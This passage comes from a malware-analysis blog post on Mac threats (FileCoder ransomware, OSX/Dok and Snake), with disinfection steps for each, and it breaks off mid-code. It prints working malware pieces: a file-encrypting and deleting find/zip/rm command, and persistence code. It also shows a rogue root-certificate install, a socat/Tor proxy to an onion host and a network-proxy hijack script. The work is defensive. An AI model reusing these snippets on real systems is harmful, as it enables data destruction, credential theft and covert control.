  <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  # ./procInfo<br>
  process start:<br>
  &nbsp;&nbsp;pid: 1258<br>
  &nbsp;&nbsp;path: <b>/usr/bin/find</b><br>
  &nbsp;&nbsp;user: 501<br>
  &nbsp;&nbsp;args: (<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"/usr/bin/find",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"/Users/",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-not",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-iname",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"README!.txt",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-print",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-exec",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;<b>zip</b>,<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-0",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;<b>"-P"</b>,<br>
      &nbsp;&nbsp;&nbsp;&nbsp;<b>gpcwPophFOZQjMDUnfQoqv9Ry</b>,<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"{}.crypt",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"{}",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;";",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-exec",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;rm,<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"{}",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;";",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-exec",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;touch,<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"-mt",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;201002130000,<br>
      &nbsp;&nbsp;&nbsp;&nbsp;"{}.crypt",<br>
      &nbsp;&nbsp;&nbsp;&nbsp;";"<br>
  )<br>
  </span>
  </div>
  <br>
  Once the ransomware as encrypted user files (under <span class="n3rdFont">/Users</span> and <span class="n3rdFont">/Volumes</span>), a <span class="n3rdFont">README!.txt</span> can be found on the desktop. Opening this, reveals the ransom instructions:
  <br><br>
    <span><img src="../images/blog/blog_0x25/fileCoderInstructions.png" width="714" style="display:block; margin:auto;"/></span>
  <br>
  As the key generated to encrypt the user files is generated (pseudo)randomly and neither stored or transmitted to the remote attacker, the file won't be 'decryptable' even if the user pays the bitcoin ransom. 
  <br>
  <br>
  Luckily, Sophos <a class="inlineLink" href="https://nakedsecurity.sophos.com/2017/02/28/filecode-ransomware-attacks-your-mac-how-to-recover-for-free/">describes</a> a trivial method to decrypt the ransomed files! In short, the encryption scheme used by <span class="n3rdFont">zip</span> to create password protected archives, is suspectible to a known plaintext attack. Since the malware 'depends' on <span class="n3rdFont">zip</span> to encrypt the user files, the whole ransoming scheme falls apart. Win one for the users!
  <br>
  <br>
	<div>
		<img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
		<span style="vertical-align:middle">disinfection:</span>
	</div>
	As the malware doesn't persist, there really isn't much to do to disinfect a system besides terminate and delete the ransomware:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont">
  $ ps aux | grep Patcher<br>
  user 1155 ~/Desktop/Office 2016 Patcher.app/Contents/MacOS/Office 2016 Patcher<br>
  <br>
  $ kill -9 1155<br>
  </span>
  </div>
  <br>
  Of course by this time, (if the ransomware is already running) it's likely too late!
  <br>

  <!-- DOK -->

  <br>
  <br>
  <a id="Dok"></a>
  <table>
  <thead>
  <tr style="border:none;">
    <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
    <img src="../images/blog/blog_0x25/dok.png" width="32" style="padding-top: 10px;"/> 
    <span style="display: inline-block; vertical-align: top; padding-top: 12px; font-variant: small-caps; font-size: 20px;">
    Dok (Retefe)
    </span>
    </th>
  </tr>
  </thead>
  <tbody>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">April, CheckPoint</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">emails campaign with malware attached</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">web traffic MitM (to steal banking info)</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove login item or launch agent(s)</td>
  </tr>

  <tr style="border:none;">
    <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
    <td style="border:none;">
      
      <ul style="list-style-type:square">
        <li><a class="inlineLink" href="https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/">"OSX Malware is Catching Up &amp; wants to Read Your HTTPS Traffic"</a> (CheckPoint)</li>
        <li><a class="inlineLink" href="https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/">"New OSX.Dok malware intercepts web traffic"</a> (MalwareBytes)</li>
      </ul>


    </td>
  </tr>
  </tbody>
  </table>
  <br>
  A macOS port of Windows 'Retefe' banking trojan, this malware installs a malicious proxy server to Man-in-the-Middle (MitM) all web traffic in order to sniff out victims' bank credentials and manipulate traffic to gain access to financial accounts.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
      <span style="vertical-align:middle">infection:</span>
  </div>
  As noted by the security researchers at CheckPoint who originally discovered OSX/Dok (read their writeup <a class="inlineLink" href="https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/">here</a>), Dok targets users via an email: "[Dok] is the first major scale malware to target OSX users via a coordinated email phishing campaign."
  <br>
  <br>
  Below is a screen-capture of one such phishing email, targeting German users (image credit CheckPoint):
  <br><br>
    <span><img src="../images/blog/blog_0x25/dokInfection.png" width="723" style="display:block; margin:auto;"/></span>
  <br>
  Attached to the malicious emails, is a zip file (<span class="n3rdFont">Dokument.zip</span>), that contains the malware. Users that naively believe the instructions in the email and unzip <span class="n3rdFont">Dokument.zip</span>, will find a single file named <span class="n3rdFont">Dokument</span>:
  <br><br>
    <span><img src="../images/blog/blog_0x25/dokPayload.png" width="359" style="display:block; margin:auto;"/></span>
  <br>
  By using a (rather pixelated) icon that mimics Apple's 'Preview' application, that attacker clearly hopes to trick the user to opening this file. By using <a class="inlineLink" href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a> we can see this file is <i>not</i> a document, but in fact a signed application (though now Apple has revoked the certificate):
  <br><br>
    <span><img src="../images/blog/blog_0x25/dokSigned.png" width="722" style="display:block; margin:auto;"/></span>
  <br>
  If the user opens the application, and clicks thru the standard "<i>is an application downloaded from the Internet. Are you sure you want to open it?</i>" warning dialog, they will become infected.
  
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
      <span style="vertical-align:middle">persistence:</span>
  </div>
  Somewhat interestingly, OSX/Dok persists in two phases. First as a Login Item, then as Launch Agents. 
  <br>
  <br>
  When Dok is (naively) launched by the user, it will executed logic to persist as a Login Item. As their name implies, Login Items will execute an application when the user logs in. 
  Apple describes how to create a Login Item both <a class="inlineLink" href="https://support.apple.com/kb/PH25590?locale=en_US">manually</a> and <a class="inlineLink" href="https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html">programmatically</a>. 
  <br>
  <br>
  To persist itself as a Login Item, Dok will invoke the <span class="n3rdFont">AddLoginScript</span> method:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  void -[AppDelegate AddLoginScript](void * self, void * _cmd) {<br>
  <br>
    &nbsp;&nbsp;&nbsp;r14 = [NSDictionary new];<br>
    &nbsp;&nbsp;&nbsp;r15 = [[NSString stringWithFormat:@<b>"tell application \"System Events\" to make<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login item at end with properties {path:\"%@\"}</b>", self->needLocation] retain];<br>
    &nbsp;&nbsp;&nbsp;rbx = [[NSAppleScript alloc] initWithSource:r15];<br>
    &nbsp;&nbsp;&nbsp;var_28 = r14;<br>
    &nbsp;&nbsp;&nbsp;[rbx executeAndReturnError:&amp;var_28];<br>
    &nbsp;&nbsp;&nbsp;return;<br>
  }
  </span>
  </div>
  <br>
  As can be seen in the <span class="n3rdFont">AddLoginScript</span> decompilation, Dok utilizes AppleScript to create the Login Item. This approach is somewhat simpler than adding a Login Item purely via APIs (such as <span class="n3rdFont">SMLoginItemSetEnabled</span>).
  <br>
  <br>
  The installed Login Item will show up in the UI (image credit CheckPoint):
  <br><br>
    <span><img src="../images/blog/blog_0x25/dokLoginItem.png" width="668" style="display:block; margin:auto;"/></span>
  <br>
  In order to elevate its privileges to persist its payload (described below), Dok displays a fake (full-screen) update window that contains a single 'Update All' button. When this button is clicked, the malware will display an authorization dialog:
  <br><br>
    <span><img src="../images/blog/blog_0x25/dokPasswordPrompt.png" width="800" style="display:block; margin:auto;"/></span>
  <br>
  It's likely that the user will enter their credentials at some point, since as noted by Thomas Reed: "<i>[the screen will] remain stubbornly on the screen and will come back on restart</i>".
  <br>
  <br>
  Armed with the user's credentials the malware will perform various nefarious actions, including the creation of two persistent Launch Agents property lists: <span class="n3rdFont">com.apple.Safari.pac.plist</span> and <span class="n3rdFont">com.apple.Safari.proxy.plist</span>. The code for this can be found in the <span class="n3rdFont">InstallTor</span> method:

  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  void -[AppDelegate InstallTor](void * self, void * _cmd) {

      rbx = [[var_38 stringByAppendingPathComponent:@"<b>com.apple.Safari.pac</b>",
            @"/usr/local/bin/socat", r8];
      r14 = [[rbx stringByAppendingPathExtension:@"plist", @"/usr/local/bin/socat", r8];


      rbx = [[var_38 stringByAppendingPathComponent:@"<b>com.apple.Safari.proxy</b>",
             @"/usr/local/bin/socat", r8];
      r12 = [[rbx stringByAppendingPathExtension:@"plist", @"/usr/local/bin/socat", r8];

      rax = [NSMutableDictionary alloc];
      rax = [rax init];
    
      r14 = rax;
      [rax setObject:@"com.apple.Safari.pac" forKeyedSubscript:@"Label", 
      @"/usr/local/bin/brew"];

      rax = [NSString stringWithFormat:@"SOCKS4A:127.0.0.1:%@:80,socksport=9050", 
      @"paoyu7gub72lykuk.onion"];
    
      rbx = [[NSArray arrayWithObjects:@"/usr/local/bin/socat", @"tcp4-LISTEN:5555,
      reuseaddr,fork,keepalive,bind=127.0.0.1", rax, 0x0] retain];
    
      [r14 setObject:rbx forKeyedSubscript:@"ProgramArguments", rax];
      rbx = [@(YES) retain];
      [r14 setObject:rbx forKey:@"RunAtLoad", rax];
      
      rbx = [@(YES) retain];
      [r14 setObject:rbx forKey:@"KeepAlive", rax];

      [r14 writeToFile:var_50 atomically:0x1, rax];
  </pre>
  </span>
  </div>
  <br>
  Dumping either of these plists, we can see the malware has persisted <span class="n3rdFont">socat</span> (a well-known proxy):
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  $ cat ~/Library/LaunchAgents/com.client.client.plist
    &lt;?xml version="1.0" encoding="UTF-8"?&gt;
    &lt;!DOCTYPE plist PUBLIC ...&gt;
    &lt;plist version="1.0"&gt;
    &lt;dict&gt;
    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.apple.Safari.pac&lt;/string&gt;
     &lt;key&gt;ProgramArguments&lt;/key&gt;
     &lt;array&gt;
     &lt;string&gt;<b>/usr/local/bin/socat</b>&lt;/string&gt;
     &lt;string&gt;tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1&lt;/string&gt;
     &lt;string&gt;SOCKS4A:127.0.0.1:paoyu7gub72lykuk.onion:80,socksport=9050&lt;/string&gt;
     &lt;/array&gt;
     &lt;key&gt;RunAtLoad&lt;/key&gt;
     &lt;true/&gt;
     ...
    &lt;/dict&gt;
    &lt;/plist&gt;</pre>
  </span>
  </div>
  <br>
  As the <span class="n3rdFont">RunAtLoad</span> key in the plists has been set to true, <span class="n3rdFont">socat</span> will be automatically started each time the system is rebooted and the user logs in.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
      <span style="vertical-align:middle">features:</span>
  </div>
  Thomas Read, who also analyzed OSX/Dok, <a class="inlineLink" href="https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/">describes</a> the malware's main goal: 

  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
    "<i>[OSX.Dok] uses sophisticated means to monitor-and potentially alter-all HTTP and HTTPS traffic to and from the infected Mac. This means that the malware is capable, for example, of capturing account credentials for any website users log into, which offers many opportunities for theft of cash and data.</i>"
  </span>
  </div>
  <br>
  Installing a proxy to MitM traffic is a common technique found in Windows banking trojans - who try to steal users' banking credentials. As previous noted, Dok appears to be a Mac port of the Windows banking trojan 'Retefe.'
  <br>
  <br>
  Let's take a closer look at how the malware is able to proxy all web traffic on an infected host.
  <br>
  <br>
  First the malware kills all running browsers, by executing the <span class="n3rdFont">CloseAllBrowsers</span> method:
  <div style="border: 1px solid gray; margin-top:10px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  void -[AppDelegate CloseAllBrowsers]
  {
     [@"killall Safari" runAsCommand];
     [@"killall firefox" runAsCommand];
     [@"killall \"Google Chrome\"" runAsCommand];

     return;
  }</pre>
  </span>
  </div>
  It then installs a new root certificate, "which allows the attacker to intercept the victim‚Äôs traffic using a Man in The Middle (MiTM) attack" (Checkpoint). In order to install this certificate, the malware simply executes the <span class="n3rdFont">security</span> command, with the  <span class="n3rdFont">add-trusted-cert</span> flag. Looking at the <span class="n3rdFont">InstallCert</span> method we can see this logic:

  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  void -[AppDelegate InstallCert]
  {
    rbx = [[NSData dataWithBytes:0x100008680 length:*(int32_t *)dword] retain];
    var_38 = rbx;
    r13 = [[@"/tmp/" stringByAppendingPathComponent:@"cert.der"] retain];
    [rbx writeToFile:r13 atomically:0x0];
    
    r15 = [NSString stringWithFormat:@"<b>security add-trusted-cert -d -r trustRoot 
                                       -k /Library/Keychains/System.keychain %@</b>", r13];
    r12 = [r15 runAsCommand];
    
    return;
  }</pre>
  </span>
  </div>
  <br>
  Here's the installed certificate (image credit: CheckPoint):
  <br><br>
    <span><img src="../images/blog/blog_0x25/dokCert.png" width="562" style="display:block; margin:auto;"/></span>
  <br>
  Once the attacker's certificate has been installed, the malware invokes the <span class="n3rdFont">InstallTor</span> method. Unsurprisingly, this installs <span class="n3rdFont">tor</span>. In order to install this (and other utilities most notable the proxy, <span class="n3rdFont">socat</span>), the malware first downloads and installs <span class="n3rdFont">Homebrew</span>:

  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
    rbx = [NSString stringWithFormat:@"sudo -u %@ echo |sudo -u %@ /usr/bin/ruby -e 
    \"$(curl -fsSL <b>https://raw.githubusercontent.com/Homebrew/install/master/install</b>)\""];

    [rbx runAsCommand];</pre>
  </span>
  </div>
  <br>
  This methods also installs the aforementioned Launch Agent plist files, which ensure the proxy, <span class="n3rdFont">socat</span>, is always running.
  <br>
  <br>
  Finally, the malware modifies the infected host's network settings in order to set up a proxy who's address is (dynamically) specified via a remote proxy auto-configuration (PAC) file. This is accomplished by decoding then executing a base64-encoded string (which turns out to be a script which re-configures network settings):
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  $ python
  >>> import base64
  >>> base64.b64decode('IyEvYmluL3NoC...XMiCg==')
  #!/bin/sh
  ip=$(curl api.ipify.org)
  str=$(env LC_CTYPE=C tr -dc "a-zA-Z0-9" < /dev/urandom | head -c 10)
  autoProxyURL="http://127.0.0.1:5555/${str}.js?ip=${ip}"

  /usr/sbin/networksetup -detectnewhardware
  IFS=$'\n'
  for i in $(networksetup -listallnetworkservices | tail +2 );
  do
    autoProxyURLLocal=`/usr/sbin/networksetup -getautoproxyurl "$i" | head -1 | cut -c 6-`
    echo "$i Proxy set to $autoProxyURLLocal"
    if [[ $autoProxyURLLocal != $autoProxyURL ]]; then
      /usr/sbin/networksetup -setautoproxyurl $i $autoProxyURL
      echo "Set auto proxy for $i to $autoProxyURL"
    fi
    /usr/sbin/networksetup -setautoproxystate "$i" on
    echo "Turned on auto proxy for $i" 
  
  done
  unset IFS
  echo "Auto proxy present, correct & enabled for all interfaces"</pre>
  </span>
  </div>
  <br>
  One can see this malicious network reconfiguration via the Network pane in System Preferences (image credit: CheckPoint):
  <br>
      <span><img src="../images/blog/blog_0x25/dokProxy.png" width="679" style="display:block; margin:auto;"/></span>
  <br>
  Once the malware has installed the attacker certificate, installed <span class="n3rdFont">tor</span> and <span class="n3rdFont">socat</span>, and reconfigured the infected host's network settings, all the user's traffic will be proxied thru the attacker's infrastructure. This is perhaps more eloquently stated by the CheckPoint researchers:
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
    "<i>As a result of all of the above actions, when attempting to surf the web, the user's web browser will first ask the attacker web page on TOR for proxy settings. The user traffic is then redirected through a proxy controlled by the attacker, who carries out a Man-In-the-Middle attack and impersonates the various sites the user attempts to surf. The attacker is free to read the victim's traffic and tamper with it in any way they please.</i>"
  </span>
  </div> 
  <br>
  So why redirect the user's traffic? Well, any number of reasons. However, as OSX/Dok is a port of a Windows banking trojan (Retefe), its main goal is to extract user's banking credentials from the redirected traffic, or manipulate traffic in order to gain access to financial accounts. For more information on this methodology, check out CheckPoint's follow-up report: <a class="inlineLink" href="https://blog.checkpoint.com/2017/07/13/osxdok-refuses-go-away-money/">OSX/Dok Refuses to Go Away and It's After Your Money</a>.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
      <span style="vertical-align:middle">disinfection:</span>
  </div>
  Fully cleaning up a OSX/Dok infection is somewhat difficult due to the multitude of changes it makes to an infected system. (As Thomas Reed notes, "<i>there are many leftovers and modifications to the system that cannot be as easily reversed.</i>").
  <br>
  <br>
  First, if it still exists, remove the malware's initial Login Item ('AppStore'). 
  <br>
  <br>
  Then, delete the two Launch Agents"

  <ol>
    <li>Unload the malware's persistent launch agent via the <span class="n3rdFont">'launchctl unload'</span> command:
      <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
      <span class="n3rdFont">
      $ launchctl unload ~/Library/LaunchAgents/com.apple.Safari.pac.plist<br>
      $ launchctl unload ~/Library/LaunchAgents/com.apple.Safari.proxy.plist<br>
      </span>
      </div>

    </li>
    <br>
    <li>Remove the malicious launch agent plist files:
     <span class="n3rdFont">~/Library/LaunchAgents/com.apple.Safari.pac.plist</span><br>
    <span class="n3rdFont">~/Library/LaunchAgents/com.apple.Safari.proxy.plist</span></li>
  </ol>
  Next, remove the attacker's certificate that was added to the system, using the Keychain Access application (certificate name: <span class="n3rdFont">COMODO RSA Extended Validation Secure Server CA 2</span>).
  <br>
  <br>
  Finally remove <span class="n3rdFont">tor</span> and <span class="n3rdFont">socat</span> via <span class="n3rdFont">HomeBrew</span> (i.e. <span class="n3rdFont">$ brew rm FORMULA</span>). If didn't have <span class="n3rdFont">HomeBrew</span> already installed - meaning the malware installed it, that can be removed as well.
  <br><br>
  Honestly, if infected with OSX/Dok it's suggested you just fully <a class="inlineLink" href="https://support.apple.com/en-us/HT204904 ">re-install macOS</a>!
  <br>


  <!-- SNAKE -->

  <br>
  <br>
  <a id="Snake"></a>
  <table>
  <thead>
  <tr style="border:none;">
    <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
    <img src="../images/blog/blog_0x25/snake.png" width="32" style="padding-top: 10px;"/> 
    <span style="display: inline-block; vertical-align: top; padding-top: 12px; font-variant: small-caps; font-size: 20px;">
    Snake
    </span>
    </th>
  </tr>
  </thead>
  <tbody>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">May, Fox-IT</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">trojanized Flash Installer</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">currently in development, but likely 'standard' cyber-espionage capabilities</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove launch daemon</td>
  </tr>

  <tr style="border:none;">
    <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
    <td style="border:none;">
      
      <ul style="list-style-type:square">
        <li><a class="inlineLink" href="https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/">"Snake: Coming soon in Mac OS X flavour"</a> (Fox-IT)</li>
        <li><a class="inlineLink" href="https://blog.malwarebytes.com/threat-analysis/2017/05/snake-malware-ported-windows-mac/">"Snake malware ported from Windows to Mac"</a> (MalwareBytes)</li>
      </ul>


    </td>
  </tr>
  </tbody>
  </table>
  <br>
  An in-progress port of the highly sophisticated Windows 'Snake' cyber-espionage persistent implant, the Mac version has yet to be seen (publicly) wild nor is fully-featured....yet!
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
      <span style="vertical-align:middle">infection:</span>
  </div>
  Fox-IT, the company that originally discovered the Mac version of Snake, note the following:
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
    "<i>Though Snake is typically spread using spear-phishing e-mails and watering hole attacks Fox-IT has not yet observed this [macOS] sample being spread in the wild.</i>"
    <br>
    <br>
    "<i>As this version contains debug functionalities ....it is likely that the OS X version of Snake is not yet operational.</i>"
  </span>
  </div>
  <br>
  Since (at the time of discovery), the macOS version of Snake is likely not yet operational, it is not surprising that has yet to be seen infecting Mac users in the wild.  
  <br>
  <br>
  What we do know, is that Snake is packaged in a trojanized Adobe Flash installer:

  <br><br>
    <span><img src="../images/blog/blog_0x25/snakeInstaller.png" width="800" style="display:block; margin:auto;"/></span>
  <br>

  This infected installer application is (re)signed, to ensure that it won't be blocked by Gatekeeper (in its default setting):
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
    ./jtool --sig "Install Adobe Flash Player.app/Install"
    Blob at offset: 46992 (9616 bytes) is an embedded signature
    Code Directory (390 bytes)
      Version:     20200
      Flags:       none
      CodeLimit:   0xb790
      Identifier:  <b>com.addy.InstallAdobeFlash</b> (0x34)
      Team ID:     <b>EHWBRW848H</b> (0x4f)
      CDHash:      ffc1a65f9153c94999212fb8bd7e3950eca035ae (computed)</pre>
  </span>
  </div>
  <br>
  As shown by <a class="inlineLink" href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a>, this certificate was revoked by Apple:
  <br><br>
    <span><img src="../images/blog/blog_0x25/snakeSigned.png" width="800" style="display:block; margin:auto;"/></span>
  <br>
  Since the format of the trojaned application bundle is rather unstandard (i.e. it's missing the <span class="n3rdFont">Contents/MacOS/</span> directory) it is not immediately clear what binary will be executed when the application is launched. However, by dumping the application's <span class="n3rdFont">Info.plist</span> file, and looking at the value of the <span class="n3rdFont">CFBundleExecutable</span> key, we can see it's a binary named <span class="n3rdFont">Install</span>:
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  $ defaults read ~/Downloads/Snake/Install\ Adobe\ Flash\ Player.app/Info.plist 
  {
    BuildMachineOSBuild = 13F34;
    CFBundleDevelopmentRegion = en;
    <b>CFBundleExecutable = Install;</b>
    CFBundleIconFile = "app.icns";
    CFBundleIdentifier = "com.addy.InstallAdobeFlash";
    CFBundleInfoDictionaryVersion = "6.0";
    CFBundleName = "Install Adobe Flash Player";
    ...
  } </pre>
  </span>
  </div>
  <br>
  The <span class="n3rdFont">Install</span> is a simple binary whose main job is to execute  a script, <span class="n3rdFont">install.sh</span>, via the <span class="n3rdFont">"do shell script [script] with administrator privileges"</span> AppleScript command:

 <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
 <span class="n3rdFont">
 <pre>
 int _main(int arg0, int arg1) {

    rax = [NSBundle mainBundle];
    rax = [rax retain];
    rax = [rax bundlePath];
    
    rax = [NSString stringWithFormat:@"'%@%@'", rax, @"<b>/install.sh</b>"];
    
    var_A8 = [NSString stringWithFormat:@"<b>do shell script \"%@\" with administrator 
              privileges</b>", rax];
    
    var_B0 = [[NSAppleScript alloc] initWithSource:var_A8];
    var_188 = [var_B0 executeAndReturnError:&var_B8];

    ...</pre>
 </span>
 </div>
 <br>
 Executing this AppleScript command will first cause the system to display a standard authentication prompt (due to the <span class="n3rdFont">"with administrator privileges"</span>):
 <br><br>
    <span><img src="../images/blog/blog_0x25/snakeAuth.png" width="442" style="display:block; margin:auto;"/></span>
 <br>  
  As installers, such as Flash, typically display such authentication prompts, it's likely the user will naively enter their credentials. At this point, the <span class="n3rdFont">install.sh</span> script will be executed with elevated privileges. 
  <br>
  <br>
  Let's dump the <span class="n3rdFont">install.sh</span> script:
 <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  #!/bin/sh
  SCRIPT_DIR=$(dirname "$0")
  TARGET_PATH=/Library/Scripts
  TARGET_PATH2=/Library/LaunchDaemons
  cp -f "${SCRIPT_DIR}/queue" "${TARGET_PATH}/queue"
  cp -f "${SCRIPT_DIR}/installdp" "${TARGET_PATH}/installdp"
  cp -f "${SCRIPT_DIR}/installd.sh" "${TARGET_PATH}/installd.sh"
  cp -f "${SCRIPT_DIR}/com.adobe.update" "$TARGET_PATH2/com.adobe.update.plist"
  "${TARGET_PATH}/installd.sh"
  "${SCRIPT_DIR}/Install Adobe Flash Player"
  exit $RC</pre>
  </span>
  </div>
  <br>
  Easy to see it:
  <ul style="list-style-type:square">
      <li>copies several files (<span class="n3rdFont">queue</span>, <span class="n3rdFont">installdp</span>, etc.), to the <span class="n3rdFont">/Library/Scripts</span> directory</li>
      <li>persists the <span class="n3rdFont">com.adobe.update</span> file as a Launch Daemon</li>
      <li>executes the <span class="n3rdFont">installd.sh</span> script</li>
      <li>kicks off the legitimate Flash installer, <span class="n3rdFont">Install Adobe Flash Player</span></li>
  </ul>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
      <span style="vertical-align:middle">persistence:</span>
  </div>
  The persistent part of the infection, is the <span class="n3rdFont">com.adobe.update</span> Launch Daemon</li>. As it's a binary plist file, dump its contents with the <span class="n3rdFont">plutil</span> utility (using the <span class="n3rdFont">-p</span> commandline flag):
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  $ plutil -p com.adobe.update 
  {
    <b>"KeepAlive" => 1</b>
    "Label" => "com.apple.update"
    "OnDemand" => 1
    "POSIXSpawnType" => "Interactive"
    "ProgramArguments" => [
      0 => "<b>/Library/Scripts/installd.sh</b>"
    ]
  }</pre>
  </span>
  </div>
  <br>
  As the <span class="n3rdFont">KeepAlive</span> key has been set to 1 (true), the Launch Daemon will be automatically started everytime the infected system is rebooted. Looking at the <span class="n3rdFont">ProgramArguments</span> array, we can see persisting the <span class="n3rdFont">installd.sh</span> script:
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  #!/bin/bash
  SCRIPT_DIR=$(dirname "$0")
  FILE="${SCRIPT_DIR}/queue#1"
  PIDS=`ps cax | grep installdp | grep -o '^[ ]*[0-9]*'`
  if [ -z "$PIDS" ]; then
    ${SCRIPT_DIR}/<b>installdp</b> ${FILE} n
  fi</pre>
  </span>
  </div>
  <br>
  As noted by the Fox-IT researchers, this "script checks if <span class="n3rdFont">installdp</span> is already running, if not it will start with <span class="n3rdFont">/Library/Scripts/queue#1 n</span>." In other words, the <span class="n3rdFont">installdp</span> binary -which is the malware's main component, will be automatically started whenever the OS is initialized.  
  <br><br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
      <span style="vertical-align:middle">features:</span>
  </div>
  This macOS port of Snake appears to be a test (or debug) build. The Fox-IT write up highlights various strings embedded within the <span class="n3rdFont">installdp</span> that backup this claim:
  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
